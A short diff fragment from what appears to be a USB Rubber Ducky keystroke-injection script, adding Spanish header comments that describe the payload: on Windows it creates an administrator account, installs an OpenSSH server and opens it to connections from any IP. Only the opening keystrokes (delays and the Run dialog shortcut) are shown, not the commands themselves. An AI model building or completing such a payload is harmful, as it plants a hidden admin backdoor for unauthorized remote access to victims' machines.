@@ -1,3 +1,7 @@
+REM Title: W10Admin+SSH
+REM Author: Sergio Cabello
+REM Target: Windows
+REM Description: Crea un Usario Admin y Instala OpenSSH server y permite conexion desde cualquier IP
 DELAY 5000
 GUI r
 DELAY 1000
